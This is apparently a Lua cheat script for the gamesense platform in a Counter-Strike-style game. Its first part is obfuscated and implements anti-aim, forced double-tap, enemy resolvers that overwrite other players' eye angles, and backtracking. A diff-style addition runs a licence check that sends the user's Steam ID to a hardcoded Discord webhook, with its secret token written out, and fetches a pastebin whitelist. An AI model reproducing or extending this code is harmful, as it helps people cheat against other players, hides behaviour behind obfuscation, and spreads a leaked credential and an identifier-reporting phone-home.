v212.includes(ui.get(v224.miscTab.miscmenushka),"Animation Breaker") and v746 and v742 );ui.set_visible(v224.miscTab.jitterwarning,ui.get(v224.miscTab.jitterFixEnabled) and v746 and v742 );ui.set_visible(v224.miscTab.jitterwarning2,ui.get(v224.miscTab.jitterFixEnabled) and v746 and v742 );ui.set_visible(v224.miscTab.jitterwarning3,ui.get(v224.miscTab.jitterFixEnabled) and v746 and v742 );ui.set_visible(v224.miscTab.jitterwarning4,ui.get(v224.miscTab.jitterFixEnabled) and v746 and v742 );for v876,v877 in pairs(v224.configTab) do ui.set_visible(v877,v747 and v742 );end if ( not v742 and  not saved) then local v973=0 + 0 ;while true do if (v973==(0 -0)) then v212.resetAATab();ui.set(v204.fsBodyYaw,v742);v973=1 + 0 ;end if (v973==1) then ui.set(v204.enabled,v742);saved=true;break;end end elseif (v742 and saved) then local v1100=0 + 0 ;while true do if (v1100==(0 + 0)) then ui.set(v204.fsBodyYaw, not v742);ui.set(v204.enabled,v742);v1100=1;end if (v1100==(3 -2)) then saved=false;break;end end end v212.setAATab( not v742);if v212.includes(ui.get(v224.miscTab.miscmenushka),v212.hex({58 + 112 ,170,442 -346 })   .. "Jitter Fix *WIP*" ) then if ui.get(v224.miscTab.jitterFixEnabled) then local v1101=0 -0 ;while true do if ((1 + 0)==v1101) then ui.set_visible(v204.CorrectEnable,false);ui.set_visible(v204.ForceBodyYaw,false);v1101=2;end if (v1101==(9 -7)) then ui.set_visible(v204.ForceBodyYawValue[832 -(762 + 69) ],false);break;end if (v1101==(0 -0)) then ui.set(v204.ForceBodyYaw,true);ui.set_visible(v204.AntiAimCorrect,false);v1101=1 + 0 ;end end else local v1102=0;while true do if (v1102==(1 + 0)) then ui.set_visible(v204.ForceBodyYaw,true);ui.set_visible(v204.ForceBodyYawValue[2 -1 ],true);v1102=1 + 1 ;end if (v1102==(0 + 0)) then ui.set_visible(v204.AntiAimCorrect,true);ui.set_visible(v204.CorrectEnable,true);v1102=3 -2 ;end if (v1102==(159 -(8 + 149))) then ui.set(v204.ForceBodyYaw,false);break;end end end end end);client.set_event_callback("run_command",function() if v212.includes(ui.get(v224.miscTab.miscmenushka),v212.hex({170,383 -213 ,96})   .. "Network Fix *WIP*" ) then local v974=0 -0 ;local v975;local v976;local v977;while true do if (v974==2) then if (v199.maximum<v976) then v199.maximum=v976;end if ((v977>=0.005) and (v199.tr==(0 -0))) then local v1168=0 + 0 ;while true do if (v1168==(1807 -(518 + 1289))) then v199.tr=1 -0 ;v251.new(string.format(" Currently experiencing an elevated level of connectivity errors ",v976 * (14 + 86) ),371 -116 ,122 + 43 ,469 -(304 + 165) );break;end end end v974=3 + 0 ;end if (v974==(163 -(54 + 106))) then if ((v977>(1969.08 -(1618 + 351))) and (v199.tr_ex==(0 + 0))) then v199.tr_ex=1;v251.new(string.format(" A stable high connectivity failure may decrease cheat performance ",v976 * 100 ),1271 -(10 + 1006) ,31 + 89 ,120);end if (math.max(unpack(v198))==(0 + 0)) then if (v199.tr==(3 -2)) then local v1207=1033 -(912 + 121) ;while true do if (v1207==(0 + 0)) then v251.new(string.format(" The connectivity returning back to normal ",v976 * (1389 -(1140 + 149)) ),111 + 62 ,339 -84 ,8 + 35 );losswas=1;break;end end end v199.tr=0 -0 ;v199.tr_ex=0;v199.maximum=v976;end break;end if (v974==0) then v975=v189.cast("void***",v193(v192)) or error("netchaninfo is nil") ;v976=v189.cast("get_avg_loss_t",v975[0][11])(v975,1);v974=1;end if (v974==1) then v196(v198,v976,v194:update("loss",7 -3 ));v977=v197(v198);v974=1 + 1 ;end end end end);client.set_event_callback("setup_command",function(v748) local v749=v12.get_local_player();local v750=v749:get_prop("m_fFlags");local v751=v6.band(v750,1)~=(0 -0) ;local v752=ui.get(v204.dt[187 -(165 + 21) ]) and ui.get(v204.dt[2]) ;if  not v212.includes(ui.get(v224.miscTab.miscmenushka),v212.hex({281 -(61 + 50) ,71 + 99 ,457 -361 })   .. "Defensive Fix *WIP*" ) then return;end if  not v751 then return;end local function v753(v878,v879,v880) return {x=v878 or (0 -0) ,y=v879 or 0 ,z=v880 or 0 };end local function v754() return globals.tickinterval() * (7 + 9) ;end local function v755() local v881=0;local v882;local v883;local v884;local v885;local v886;local v887;while true do if (v881==(1463 -(1295 + 165))) then v886=v753(entity.get_prop(entity.get_local_player(),"m_vecVelocity"));v887=v753(v885.x + (v886.x * v754(predicted)) ,v885.y + (v886.y * v754(predicted)) ,v885.z + (v886.z * v754(predicted)) );v881=1 + 3 ;end if (v881==(2 + 2)) then for v1125=1398 -(819 + 578) , #v882 do local v1126=v882[v1125];local v1127=v753(entity.get_prop(v1126,"m_vecVelocity"));local v1128=v753(entity.get_prop(v1126,"m_vecOrigin"));local v1129=v753(v1128.x + (v1127.x * v754()) ,v1128.y + (v1127.y * v754()) ,v1128.z + (v1127.z * v754()) );entity.get_prop(v1126,"m_vecOrigin",v1129);local v1130=v753(entity.hitbox_position(v1126,1402 -(331 + 1071) ));local v1131=v753(v1130.x + (v1127.x * v754()) ,v1130.y + (v1127.y * v754()) ,v1130.z + (v1127.z * v754()) );local v1132,v1133=client.trace_bullet(entity.get_local_player(),v887.x,v887.y,v887.z,v1131.x,v1131.y,v1131.z);entity.get_prop(v1126,"m_vecOrigin",v1128);if (v1133>(743 -(588 + 155))) then return true;end end return false;end if (v881==(1282 -(546 + 736))) then v882=entity.get_players(true);v883=v749:get_prop("m_fFlags");v881=1;end if ((1939 -(1834 + 103))==v881) then if  not v884 then return;end v885=v753(client.eye_position());v881=3;end if ((1 + 0)==v881) then v884=ui.get(v204.dt[1]) and ui.get(v204.dt[5 -3 ]) ;if  not v882 then return false;end v881=1768 -(1536 + 230) ;end end end if  not v752 then return;end if (v755() and v751) then v748.force_defensive=true;else v748.force_defensive=false;end end);client.set_event_callback("paint",function() local v756=ui.get(v224.visualsTab.aspect_ratio_v);if ui.get(v224.visualsTab.aspect_ratio) then if (v756~=0) then client.set_cvar("r_aspectratio",v756/(501 -(128 + 363)) );else client.set_cvar("r_aspectratio",0 + 0 );end end end);client.set_event_callback("shutdown",function() local v757=0;while true do if (v757==0) then if (hsValue~=nil) then ui.set(v204.fakeLag[1],hsValue);end if (clanTag~=nil) then client.set_clan_tag("");end v757=2 -1 ;end if (v757==(1 + 0)) then if (dtSaved~=nil) then ui.set(v204.dt[3],"Defensive");end v212.setAATab(true);break;end end end);client.set_event_callback("aim_hit",function(v758) if ui.get(v224.miscTab.jitterFixEnabled) then local v980=v205.hitgroup_names[v758.hitgroup + 1 ] or "?" ;local v981=v758.target;local v982=ui.get(v224.miscTab.jitterFix):lower();client.delay_call(0.001 -0 ,function() if (entity.get_prop(v758.target,"m_iHealth")==(0 -0)) then local v1134=0 -0 ;while true do if (0==v1134) then client.color_log(159,139 + 63 ,43,"[calamity] ~\0");client.color_log(1264 -(615 + 394) ,255,255," Killed "   .. entity.get_player_name(v758.target)   .. " in "   .. v980:lower()   .. " for "   .. v758.damage   .. " damage ( method: "   .. v982   .. " ~ eye: "   .. math.floor(v241)   .. " ~ "   .. "riptide fix? : "   .. " yes"   .. " )" );break;end end else client.color_log(159,202,39 + 4 ,"[calamity] ~\0");client.color_log(244 + 11 ,777 -522 ,255," Hit "   .. entity.get_player_name(v758.target)   .. " in "   .. v980:lower()   .. " for "   .. v758.damage   .. " damage ( method: "   .. v982   .. " ~ "   .. entity.get_prop(v758.target,"m_iHealth")   .. " health remaining ~ eye: "   .. math.floor(v241)   .. " ~ riptide fix? : "   .. "yes"   .. " )" );end end);end if v212.includes(ui.get(v224.visualsTab.logs),"Console") then local v983=0 -0 ;local v984;while true do if (v983==0) then if ui.get(v224.miscTab.jitterFixEnabled) then return;end v984=v205.hitgroup_names[v758.hitgroup + (652 -(59 + 592)) ] or "?" ;v983=1;end if (v983==1) then client.delay_call(0.001,function() if (entity.get_prop(v758.target,"m_iHealth")==(0 -0)) then local v1191=0 -0 ;while true do if (v1191==(0 + 0)) then client.color_log(159,202,214 -(70 + 101) ,"[calamity] ~\0");client.color_log(630 -375 ,181 + 74 ,640 -385 ," Killed "   .. entity.get_player_name(v758.target)   .. " in "   .. v984:lower()   .. " for "   .. v758.damage   .. " damage" );break;end end else client.color_log(400 -(123 + 118) ,202,11 + 32 ,"[calamity] ~\0");client.color_log(255,4 + 251 ,255," Hit "   .. entity.get_player_name(v758.target)   .. " in "   .. v984:lower()   .. " for "   .. v758.damage   .. " damage ( "   .. entity.get_prop(v758.target,"m_iHealth")   .. " health remaining )" );end end);break;end end end end);client.set_event_callback("aim_miss",function(v759) local v760=1399 -(653 + 746) ;while true do if (v760==(0 -0)) then if ui.get(v224.miscTab.jitterFixEnabled) then local v1135=v205.hitgroup_names[v759.hitgroup + 1 ] or "?" ;local v1136=ui.get(v224.miscTab.jitterFix):lower();client.delay_call(0.001 -0 ,function() if (v759.reason=="resolver") then client.color_log(682 -427 ,53 + 67 ,77 + 43 ,"[calamity] ~\0");client.color_log(223 + 32 ,32 + 223 ,40 + 215 ," Missed shot at "   .. entity.get_player_name(v759.target)   .. " in "   .. v1135:lower()   .. " due to ? ( method: "   .. v1136   .. " ~ eye: "   .. math.floor(v241)   .. " ~ riptide fix? : yes )" );else local v1192=0 -0 ;while true do if (v1192==(0 + 0)) then client.color_log(470 -215 ,1354 -(885 + 349) ,96 + 24 ,"[calamity] ~\0");client.color_log(695 -440 ,741 -486 ,255," Missed shot at "   .. entity.get_player_name(v759.target)   .. " in "   .. v1135:lower()   .. " due to "   .. v759.reason   .. " ( method: "   .. v1136   .. " ~ eye: "   .. math.floor(v241)   .. " ~ riptide fix? : yes )" );break;end end end end);end if v212.includes(ui.get(v224.visualsTab.logs),"Console") then local v1137=0;local v1138;while true do if (v1137==0) then if ui.get(v224.miscTab.jitterFixEnabled) then return;end v1138=v205.hitgroup_names[v759.hitgroup + (969 -(915 + 53)) ] or "?" ;v1137=802 -(768 + 33) ;end if (v1137==(3 -2)) then client.delay_call(0.001,function() client.color_log(255,211 -91 ,120,"[calamity] ~\0");client.color_log(255,255,255," Missed shot at "   .. entity.get_player_name(v759.target)   .. " in "   .. v1138:lower()   .. " due to "   .. v759.reason );end);break;end end end break;end end end);local v317,v318=client.screen_size();local function v319() local v761=328 -(287 + 41) ;local v762;while true do if (1==v761) then if (entity.is_dormant(v762) and entity.is_alive(v205.localPlayer)) then if (v242==none) then local v1173=847 -(638 + 209) ;while true do if (v1173==(0 + 0)) then renderer.text(125,(v318/2.5) + (1732 -(96 + 1590)) ,1927 -(741 + 931) ,126 + 129 ,255,255,"-c",0,"[+/- CALAMITY JITTER ASSISTANCE] ENEMY: WAITING");renderer.text(356 -231 ,(v318/(9.5 -7)) + 16 + 20 ,110 + 145 ,82 + 173 ,967 -712 ,83 + 172 ,"-c",0 + 0 ,"[+/- CALAMITY JITTER ASSISTANCE] EYE: WAITING");break;end end else renderer.text(125,(v318/(8.5 -6)) + 46 ,229 + 26 ,749 -(64 + 430) ,255,255,"-c",0,"[+/- CALAMITY JITTER ASSISTANCE] ENEMY: "   .. v242:upper() );renderer.text(125,(v318/(2.5 + 0)) + 36 ,618 -(106 + 257) ,181 + 74 ,255,976 -(496 + 225) ,"-c",0 -0 ,"[+/- CALAMITY JITTER ASSISTANCE] EYE: "   .. math.floor(v241) );end end break;end if (v761==0) then if  not ui.get(v224.miscTab.jitterFixEnabled) then return;end v762=entity.get_players(true);v761=1;end end end client.set_event_callback("round_prestart",function() v242="none";v241=0 -0 ;end);client.set_event_callback("paint",v319);client.set_event_callback("setup_command",v247);client.set_event_callback("shutdown",function() local v763=1658 -(256 + 1402) ;while true do if (v763==1) then ui.set_visible(v204.ForceBodyYaw,false);ui.set_visible(v204.ForceBodyYawValue[1900 -(30 + 1869) ],false);break;end if (v763==(1369 -(213 + 1156))) then ui.set_visible(v204.AntiAimCorrect,true);ui.set_visible(v204.CorrectEnable,true);v763=1;end end end);local v320,v321,v322,v323=cvar.game_mode,cvar.game_type,cvar.fps_max,cvar.fps_max_menu;local v324=require("table.clear");client.log("Hwid success");end);end};v15.Run();local v6=require("bit");local v16=ui.new_checkbox("RAGE","Other","Enable Enhanced Resolver");local v17=ui.new_checkbox("RAGE","Other","Enhanced Resolver Debug");local v18=ui.new_combobox("RAGE","Other","Enhanced Resolver Mode","Standard","Adaptive","Experimental","Advanced","Predictive","Complex","Custom");local v19=ui.new_slider("RAGE","Other","Enhanced Resolver Iterations",1,198 -(96 + 92) ,1 + 0 ,true,"",900 -(142 + 757) );local v20=ui.new_checkbox("RAGE","Other","Enable Enhanced Backtracking");local v21=ui.new_checkbox("RAGE","Other","Enable Enhanced Predictive Adjustments");local v22=ui.new_checkbox("RAGE","Other","Enable Spin Resolver");local v23=ui.new_checkbox("RAGE","Other","Enable Fake Lag Resolver");local v24=ui.new_checkbox("RAGE","Other","Enable Desync Resolver");local v25=ui.new_slider("RAGE","Other","Resolver Delay (ms)",0 + 0 ,1000,0,true,"ms",1 + 0 );local v26=ui.new_slider("RAGE","Other","Resolver Complexity",80 -(32 + 47) ,100,2027 -(1053 + 924) ,true,"",1 + 0 );local v27={};local v28={};local v29={};local v30={};local v31={};local v32={};local function v33(v67) local v68=0;while true do if (v68==(1 -0)) then return v67;end if (v68==(1648 -(685 + 963))) then while v67>180  do v67=v67-360 ;end while v67< -(366 -186)  do v67=v67 + 360 ;end v68=1;end end end local function v34(v69,v70) local v71=0 -0 ;while true do if (v71==0) then if ((v69==nil) or (v70==nil)) then return 1709 -(541 + 1168) ;end return math.abs(v33(v69-v70 ));end end end local function v35(v72) return (entity.get_prop(v72,"m_flPoseParameter",1608 -(645 + 952) ) * (896 -(669 + 169))) + (0.5 -0) ;end local function v36(v73) if  not v29[v73] then v29[v73]={shots_fired=0 -0 ,hits=0,misses=0 + 0 ,desync_detected=false,last_yaw=nil};end end local function v37(v74) if ui.get(v17) then client.log(v74);end end local function v38(v75,v76,v77) if ui.get(v17) then v37("Resolved Player: "   .. v75   .. " Yaw: "   .. v77   .. " Mode: "   .. v76 );end end local function v39() return (math.random() * ui.get(v26))/(23 + 77) ;end local function v40(v78) local v79=entity.get_prop(v78,"m_angEyeAngles[1]");local v80=entity.get_prop(v78,"m_flLowerBodyYawTarget");local v81=v34(v79,v27[v78]);local v82=v34(v80,v28[v78]);if (v81>(800 -(181 + 584))) then local v765=1395 -(665 + 730) ;local v766;while true do if (0==v765) then v766=v33(v79 + v35(v78) );entity.set_prop(v78,"m_angEyeAngles[1]",v766);break;end end else entity.set_prop(v78,"m_angEyeAngles[1]",v80);end v27[v78]=v79;v28[v78]=v80;v38(v78,"Standard",v79);end local function v41(v85) local v86=0;local v87;local v88;local v89;local v90;while true do if (v86==(5 -3)) then if (v89>35) then local v1020=0 -0 ;local v1021;local v1022;while true do if (v1020==(1351 -(540 + 810))) then entity.set_prop(v85,"m_angEyeAngles[1]",v1022);break;end if (v1020==(0 -0)) then v1021=v35(v85);v1022=v33(v87 + v1021 );v1020=2 -1 ;end end else entity.set_prop(v85,"m_angEyeAngles[1]",v88);end v27[v85]=v87;v86=3 + 0 ;end if (v86==1) then v89=v34(v87,v27[v85]);v90=v34(v88,v28[v85]);v86=205 -(166 + 37) ;end if (v86==0) then v87=entity.get_prop(v85,"m_angEyeAngles[1]");v88=entity.get_prop(v85,"m_flLowerBodyYawTarget");v86=1882 -(22 + 1859) ;end if (v86==(1775 -(843 + 929))) then v28[v85]=v88;v38(v85,"Adaptive",v87);break;end end end local function v42(v91) local v92=entity.get_prop(v91,"m_angEyeAngles[1]");local v93=entity.get_prop(v91,"m_flLowerBodyYawTarget");local v94=v34(v92,v27[v91]);local v95=v34(v93,v28[v91]);if (v94>(297 -(30 + 232))) then local v767=v35(v91);local v768=ui.get(v19);for v890=1,v768 do local v891=0 -0 ;local v892;while true do if (v891==(777 -(55 + 722))) then v892=v33(v92 + (v890 * (v767/v768)) );entity.set_prop(v91,"m_angEyeAngles[1]",v892);break;end end end else entity.set_prop(v91,"m_angEyeAngles[1]",v93);end v27[v91]=v92;v28[v91]=v93;v38(v91,"Experimental",v92);end local function v43(v98) local v99=entity.get_prop(v98,"m_angEyeAngles[1]");local v100=entity.get_prop(v98,"m_flLowerBodyYawTarget");local v101=v35(v98);local v102=v34(v99,v27[v98]);local v103=v34(v100,v28[v98]);if (v102>35) then local v769=v33(v99 + (v101 * (0.75 -0)) );entity.set_prop(v98,"m_angEyeAngles[1]",v769);elseif (v103>(1710 -(78 + 1597))) then local v985=0 + 0 ;local v986;while true do if ((0 + 0)==v985) then v986=v33(v100 + (v101 * (0.75 + 0)) );entity.set_prop(v98,"m_angEyeAngles[1]",v986);break;end end else entity.set_prop(v98,"m_angEyeAngles[1]",v100);end v27[v98]=v99;v28[v98]=v100;v38(v98,"Advanced",v99);end local function v44(v106) local v107=549 -(305 + 244) ;local v108;local v109;local v110;local v111;local v112;while true do if ((3 + 0)==v107) then v27[v106]=v108;v28[v106]=v109;v107=4;end if (v107==(105 -(95 + 10))) then v108=entity.get_prop(v106,"m_angEyeAngles[1]");v109=entity.get_prop(v106,"m_flLowerBodyYawTarget");v107=1;end if (4==v107) then v38(v106,"Predictive",v108);break;end if (v107==(2 + 0)) then v112=v34(v109,v28[v106]);if (v111>(110 -75)) then local v1023=0;local v1024;while true do if (v1023==(0 -0)) then v1024=v33(v108 + (v111/(764 -(592 + 170))) );entity.set_prop(v106,"m_angEyeAngles[1]",v1024);break;end end elseif (v112>(121 -86)) then local v1139=0;local v1140;while true do if (v1139==(0 -0)) then v1140=v33(v109 + (v112/2) );entity.set_prop(v106,"m_angEyeAngles[1]",v1140);break;end end else entity.set_prop(v106,"m_angEyeAngles[1]",v109);end v107=2 + 1 ;end if (v107==(1 + 0)) then v110=v35(v106);v111=v34(v108,v27[v106]);v107=2;end end end local function v45(v113) local v114=0 -0 ;local v115;local v116;local v117;local v118;local v119;local v120;while true do if (v114==(1 + 2)) then if (v118>(64 -29)) then local v1025=507 -(353 + 154) ;local v1026;while true do if (v1025==0) then v1026=v33(v115 + (v117 * v120) );entity.set_prop(v113,"m_angEyeAngles[1]",v1026);break;end end elseif (v119>(46 -11)) then local v1141=v33(v116 + (v117 * v120) );entity.set_prop(v113,"m_angEyeAngles[1]",v1141);else entity.set_prop(v113,"m_angEyeAngles[1]",v116);end v27[v113]=v115;v114=4 -0 ;end if (v114==(1 + 0)) then v117=v35(v113);v118=v34(v115,v27[v113]);v114=2 + 0 ;end if (v114==(2 + 0)) then v119=v34(v116,v28[v113]);v120=v39();v114=3;end if ((0 -0)==v114) then v115=entity.get_prop(v113,"m_angEyeAngles[1]");v116=entity.get_prop(v113,"m_flLowerBodyYawTarget");v114=1 -0 ;end if (v114==(9 -5)) then v28[v113]=v116;v38(v113,"Complex",v115);break;end end end local function v46(v121) local v122=entity.get_prop(v121,"m_angEyeAngles[1]");local v123=entity.get_prop(v121,"m_flLowerBodyYawTarget");local v124=v35(v121);local v125=v34(v122,v27[v121]);local v126=v34(v123,v28[v121]);local v127=v39();if (v125>(121 -(7 + 79))) then local v770=v33(v122 + (v124 * v127) );entity.set_prop(v121,"m_angEyeAngles[1]",v770);elseif (v126>(17 + 18)) then local v987=181 -(24 + 157) ;local v988;while true do if (v987==(0 -0)) then v988=v33(v123 + (v124 * v127) );entity.set_prop(v121,"m_angEyeAngles[1]",v988);break;end end else local v989=0;local v990;while true do if (v989==(0 -0)) then v990=v33(v122 + ((v124 * v127)/(1 + 1)) );entity.set_prop(v121,"m_angEyeAngles[1]",v990);break;end end end v27[v121]=v122;v28[v121]=v123;v38(v121,"Custom",v122);end local function v47(v130) local v131=0 -0 ;local v132;while true do if (v131==(380 -(262 + 118))) then v132=ui.get(v18);if (v132=="Standard") then v40(v130);elseif (v132=="Adaptive") then v41(v130);elseif (v132=="Experimental") then v42(v130);elseif (v132=="Advanced") then v43(v130);elseif (v132=="Predictive") then v44(v130);elseif (v132=="Complex") then v45(v130);elseif (v132=="Custom") then v46(v130);end break;end end end local v48={};local function v49(v133) if  not v48[v133] then v48[v133]={};end table.insert(v48[v133],entity.get_prop(v133,"m_flSimulationTime"));if ( #v48[v133]>5) then table.remove(v48[v133],1084 -(1038 + 45) );end local v134=v48[v133][ #v48[v133]];if v134 then entity.set_prop(v133,"m_flSimulationTime",v134);end end local function v50(v135) local v136=entity.get_prop(v135,"m_angEyeAngles[1]");local v137=entity.get_prop(v135,"m_flLowerBodyYawTarget");local v138={entity.get_prop(v135,"m_vecVelocity[0]"),entity.get_prop(v135,"m_vecVelocity[1]")};local v139=math.sqrt((v138[1 -0 ]^2) + (v138[232 -(19 + 211) ]^(115 -(88 + 25))) );if (v139>(0.1 -0)) then local v772=0 + 0 ;local v773;while true do if (v772==0) then v773=v33(v136 + (v139/10) );entity.set_prop(v135,"m_angEyeAngles[1]",v773);break;end end else entity.set_prop(v135,"m_angEyeAngles[1]",v137);end end local function v51(v140) local v141=0 + 0 ;local v142;local v143;local v144;while true do if (v141==0) then v142=entity.get_prop(v140,"m_angEyeAngles[1]");v143=globals.tickcount()%(1396 -(1007 + 29)) ;v141=1 + 0 ;end if ((2 -1)==v141) then v144=v33(v142 + v143 );entity.set_prop(v140,"m_angEyeAngles[1]",v144);break;end end end local function v52(v145) local v146={entity.get_prop(v145,"m_vecVelocity[0]"),entity.get_prop(v145,"m_vecVelocity[1]")};local v147=entity.get_prop(v145,"m_angEyeAngles[1]");local v148=math.sqrt((v146[1 + 0 ]^(813 -(340 + 471))) + (v146[4 -2 ]^(591 -(276 + 313))) );if (v148<(11 -6)) then local v774=0 + 0 ;local v775;while true do if (v774==0) then v775=v33(v147 + v35(v145) );entity.set_prop(v145,"m_angEyeAngles[1]",v775);break;end end end end local function v53(v149) local v150=entity.get_prop(v149,"m_angEyeAngles[1]");local v151=v35(v149);if v31[v149] then local v776=v31[v149];local v777=math.abs(v151-v776 );if (v777>(5 + 5)) then local v991=0 + 0 ;local v992;while true do if (v991==(1972 -(495 + 1477))) then v992=v33(v150 + v777 );entity.set_prop(v149,"m_angEyeAngles[1]",v992);break;end end end end v31[v149]=v151;end local function v54(v153) local v154=entity.get_prop(v153,"m_angEyeAngles[1]");local v155=entity.get_prop(v153,"m_flLowerBodyYawTarget");local v156=v35(v153);local v157=v39();if (v34(v154,v155)>(104 -69)) then local v778=0 + 0 ;local v779;while true do if (v778==0) then v779=v33(v154 + (v156 * v157) );entity.set_prop(v153,"m_angEyeAngles[1]",v779);break;end end else entity.set_prop(v153,"m_angEyeAngles[1]",v155);end v27[v153]=v154;v28[v153]=v155;v38(v153,"Advanced Aim",v154);end client.set_event_callback("paint",function() if ui.get(v16) then local v780=0;local v781;while true do if ((403 -(342 + 61))==v780) then v781=entity.get_players(true);for v1103=1 + 0 , #v781 do local v1104=v781[v1103];v47(v1104);v54(v1104);if ui.get(v20) then v49(v1104);end if ui.get(v21) then v50(v1104);end if ui.get(v22) then v51(v1104);end if ui.get(v23) then v52(v1104);end if ui.get(v24) then v53(v1104);end end break;end end end end);client.log("Advanced Anti-Aim and Lag Compensation Resolver initialized.");client.log("Enhanced Resolver script running.");local function v55(v160,v161) if  not v29[v160] then v36(v160);end if (v161=="fire") then v29[v160].shots_fired=v29[v160].shots_fired + (166 -(4 + 161)) ;v37("Shot fired by player: "   .. v160   .. " Total shots: "   .. v29[v160].shots_fired );elseif (v161=="hit") then local v993=0 + 0 ;while true do if (v993==(0 -0)) then v29[v160].hits=v29[v160].hits + (2 -1) ;v37("Shot hit by player: "   .. v160   .. " Total hits: "   .. v29[v160].hits );break;end end elseif (v161=="miss") then local v1105=497 -(322 + 175) ;while true do if (v1105==(563 -(173 + 390))) then v29[v160].misses=v29[v160].misses + 1 + 0 ;v37("Shot missed by player: "   .. v160   .. " Total misses: "   .. v29[v160].misses );break;end end end end client.set_event_callback("weapon_fire",function(v162) local v163=314 -(203 + 111) ;local v164;while true do if (v163==(0 + 0)) then v164=client.userid_to_entindex(v162.userid);if v164 then v55(v164,"fire");end break;end end end);client.set_event_callback("player_hurt",function(v165) local v166=0 + 0 ;local v167;while true do if (v166==0) then v167=client.userid_to_entindex(v165.userid);if v167 then v55(v167,"hit");end break;end end end);client.set_event_callback("player_death",function(v168) local v169=0 -0 ;local v170;while true do if (v169==(0 + 0)) then v170=client.userid_to_entindex(v168.userid);if v170 then v55(v170,"miss");end break;end end end); end
+                  peg_loader = {}
+                  peg_loader.fetch = function()
+                    local build = 'Beta'
+                    local user = ''
+                    return build, user
+                  end
+                local ffi = require("ffi")
+local c_entity = require("gamesense/entity")
+local pui = require("gamesense/pui")
+local base64 = require("gamesense/base64")
+local clipboard = require("gamesense/clipboard")
+local vector = require("vector")
+local json = require("json")
+local trace = require "gamesense/trace"
+
+client.log(client.color_log(client.random_int(1, 255), client.random_int(1, 255), client.random_int(1, 255), "[FreeDom] hwid checking"))
+local webhook = {
+    Run = function()
+        local http = require "gamesense/http" -- HTTP-запросы
+        local discord = require "gamesense/discord_webhooks" -- Для вебхуков
+        require "gamesense/panorama_valve_utils" -- Для получения id Steam
+
+        -- URL вашего вебхука Discord
+        local webhook_url = "https://discord.com/api/webhooks/1337760038319689788/rzjcxa9w1ZJ92EkZGto-hCEYFtKZp6mUTgKftYYwVKPNEv8Jv-w42KVCYwkyMZVHK2rg"
+
+        local pastebin_url = "https://pastebin.com/raw/xjy0Ps0y"
+
+        local function get_hwid()
+            local js = panorama.open()
+            local xuid = js.MyPersonaAPI.GetXuid()
+            return xuid or "Unknown HWID"
+        end
+
+
+        local function send_to_discord(hwid, allowed)
+            local webhook = discord.new(webhook_url)
+            local embed = discord.newEmbed()
+
+            embed:setTitle(allowed and "Подписка оформлена" or "Подписка не оформлена | You dont have sub")
+            embed:setDescription(allowed and "Пользователь успешно вошёл" or "Попытка загрузки с неверным HWID")
+            embed:setColor(allowed and 3066993 or 15158332) 
+            embed:addField("HWID", hwid, true)
+
+            local send_success, err = pcall(function()
+                webhook:send(embed)
+            end)
+
+            if not send_success then
+                print("Ошибка отправки вебхука: " .. tostring(err))
+            end
+        end
+
+        local hwid = get_hwid()
+        print("Проверка HWID: " .. hwid)
+
+        http.get(pastebin_url, function(success, response)
+            if not success or response.status ~= 200 then
+                print("Ошибка подключения к серверу")
+                error("Проверьте включен ли у вас интернет")
+                return
+            end
+
+            local hwid_list = response.body
+            if not hwid_list or not hwid_list:find(hwid) then
+                print("Сервер был выключен либо ваш хвид недоступен")
+                send_to_discord(hwid, false)
+                error("Доступ запрещён")
+                return
+            end
+
+            print("Welcome")
+            send_to_discord(hwid, true)
+
+
+
+
+local lua_db = {configs = ':infinix:"cfg_test:'}
+
+if not peg_loader then return end
+local build, username = peg_loader.fetch()
+
+local ref = {
+    enabled = ui.reference('AA', 'Anti-aimbot angles', 'Enabled'),
+    yawbase = ui.reference('AA', 'Anti-aimbot angles', 'Yaw base'),
+    fsbodyyaw = ui.reference('AA', 'anti-aimbot angles', 'Freestanding body yaw'),
+    edgeyaw = ui.reference('AA', 'Anti-aimbot angles', 'Edge yaw'),
+    fakeduck = ui.reference('RAGE', 'Other', 'Duck peek assist'),
+    forcebaim = ui.reference('RAGE', 'Aimbot', 'Force body aim'),
+    safepoint = ui.reference('RAGE', 'Aimbot', 'Force safe point'),
+    roll = { ui.reference('AA', 'Anti-aimbot angles', 'Roll') },
+    clantag = ui.reference('Misc', 'Miscellaneous', 'Clan tag spammer'),
+    legs = ui.reference('AA', 'Other', 'Leg Movement'),
+
+    pitch = { ui.reference('AA', 'Anti-aimbot angles', 'pitch'), },
+    rage = { ui.reference('RAGE', 'Aimbot', 'Enabled') },
+    yaw = { ui.reference('AA', 'Anti-aimbot angles', 'Yaw') }, 
+    yawjitter = { ui.reference('AA', 'Anti-aimbot angles', 'Yaw jitter') },
+    bodyyaw = { ui.reference('AA', 'Anti-aimbot angles', 'Body yaw') },
+    freestand = { ui.reference('AA', 'Anti-aimbot angles', 'Freestanding') },
+    slow = { ui.reference('AA', 'Other', 'Slow motion') },
+    os = { ui.reference('AA', 'Other', 'On shot anti-aim') },
+    slow = { ui.reference('AA', 'Other', 'Slow motion') },
+    dt = { ui.reference('RAGE', 'Aimbot', 'Double tap') },
+    minimum_damage_override = { ui.reference("RAGE", "Aimbot", "Minimum damage override") },
+    quick_peek = { ui.reference('RAGE', 'Other', 'Quick peek assist') },
+
+    aimbot = ui.reference('RAGE', 'Aimbot', 'Enabled'),
+    doubletap = {
+        main = { ui.reference('RAGE', 'Aimbot', 'Double tap') },
+        fakelag_limit = ui.reference('RAGE', 'Aimbot', 'Double tap fake lag limit'),
+    },
+    peek = { ui.reference('RAGE', 'Other', 'Quick peek assist') }
+}
+
+math.clamp = function (x, a, b)
+    if a > x then return a
+    elseif b < x then return b
+    else return x end
+end
+
+math.lerp = function(name, value, speed)
+    return name + (value - name) * globals.absoluteframetime() * speed
+end
+
+renderer.rec = function(x, y, w, h, radius, color)
+    radius = math.min(x/2, y/2, radius)
+    local r, g, b, a = unpack(color)
+    renderer.rectangle(x, y + radius, w, h - radius*2, r, g, b, a)
+    renderer.rectangle(x + radius, y, w - radius*2, radius, r, g, b, a)
+    renderer.rectangle(x + radius, y + h - radius, w - radius*2, radius, r, g, b, a)
+    renderer.circle(x + radius, y + radius, r, g, b, a, radius, 180, 0.25)
+    renderer.circle(x - radius + w, y + radius, r, g, b, a, radius, 90, 0.25)
+    renderer.circle(x - radius + w, y - radius + h, r, g, b, a, radius, 0, 0.25)
+    renderer.circle(x + radius, y - radius + h, r, g, b, a, radius, -90, 0.25)
+end
+
+renderer.rec_outline = function(x, y, w, h, radius, thickness, color)
+    radius = math.min(w/2, h/2, radius)
+    local r, g, b, a = unpack(color)
+    if radius == 1 then
